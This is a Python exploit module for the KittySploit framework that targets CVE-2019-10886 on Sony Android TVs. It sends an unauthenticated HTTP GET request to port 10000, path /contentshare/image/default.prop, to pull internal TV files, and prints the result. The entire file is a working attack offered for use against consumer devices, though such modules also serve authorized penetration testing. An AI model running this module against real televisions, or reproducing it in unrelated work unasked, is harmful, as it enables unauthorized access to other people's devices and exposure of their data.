from kittysploit import *
from lib.http.http_client import HTTPClient

class Module(Auxiliary, HTTPClient):
	
	__info__ = {
		'name': 'Android properties from a Sony TV',
		'description': 'Get internal TV files over HTTP without authentication',
		'author': 'KittySploit Team',
		'cve': '2019-10886',
	}

	def run(self):

		headers = {
			'Content-Type':'application/json',
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
		}

		creds = self.http_request(
						method = "GET",
						path = ":10000/contentshare/image/default.prop",
						headers = headers
						)
		
		if creds.status_code == 200:
			print_status(creds.json())
			return True
		else:
			print_error("Failed : status code {}".format(creds.status_code))
			return False